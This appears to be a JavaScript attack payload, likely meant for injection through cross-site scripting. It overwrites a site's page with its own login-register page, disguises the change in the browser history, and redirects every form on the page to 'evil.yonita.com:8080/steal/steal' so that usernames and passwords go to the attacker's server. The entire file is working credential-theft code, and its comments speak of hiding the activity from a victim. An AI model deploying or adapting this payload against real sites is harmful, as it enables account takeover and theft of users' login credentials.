function override(url) {
    var req = new XMLHttpRequest();
    req.open('GET', url, false);
    req.onreadystatechange = function () {
        if (req.readyState == 4 && req.responseText != '') {
            document.open("text/html", "replace");
            document.write(req.responseText);
            document.close();
        }
    };
    req.send(null);
}

window.addEventListener('load', function () {
    // override the originally loaded page
    // we'll use the original page of the application (/login-register),
    // but we'll modify the form elements to point to our server
    override('/login-register');
    // hide the activity from a victim
    history.pushState({he: 'he'}, document.getElementsByTagName('title')[0].innerHTML, '/login-register');
    // replace actions for all forms
    // we need to prepare our malicious server which listens on evil.yonita.com:8080
    // and collects all form data sent to it (including usernames and passwords!)
    var forms = document.getElementsByTagName('form');
    for (i = 0; i < forms.length; i++) {
        void(forms[i].action = 'http://evil.yonita.com:8080/steal/steal');
    }
});

